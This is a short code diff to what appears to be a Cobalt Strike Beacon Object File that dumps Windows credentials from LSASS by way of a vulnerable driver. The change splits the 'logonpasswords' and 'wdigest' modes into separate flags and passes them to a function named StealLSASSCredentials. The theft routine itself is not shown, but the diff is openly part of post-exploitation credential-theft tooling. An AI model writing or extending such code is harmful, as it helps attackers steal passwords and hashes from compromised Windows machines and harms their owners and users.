@@ -58,7 +58,19 @@ int go(char *args, int argLen)
         return FALSE;
     }
 
-    if ( (strcmp(mode, "logonpasswords") != 0) && (strcmp(mode, "wdigest") != 0) )
+    BOOL RetrieveMSV1Credentials = FALSE;
+    BOOL RetrieveWDigestCredentials = FALSE;
+
+    if (strcmp(mode, "logonpasswords") == 0)
+    {
+        RetrieveMSV1Credentials = TRUE;
+    }
+    if (strcmp(mode, "wdigest") == 0)
+    {
+        RetrieveWDigestCredentials = TRUE;
+    }
+
+    if (!RetrieveMSV1Credentials && !RetrieveWDigestCredentials)
     {
         BeaconPrintf(CALLBACK_ERROR, "Invalid argument!");
         return FALSE;
@@ -124,8 +136,8 @@ int go(char *args, int argLen)
         return FALSE;
     }
 
-    
-    StealLSASSCredentials(hFile, WindowsVersion);
+
+    StealLSASSCredentials(hFile, WindowsVersion, RetrieveMSV1Credentials, RetrieveWDigestCredentials);
 
 
     BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
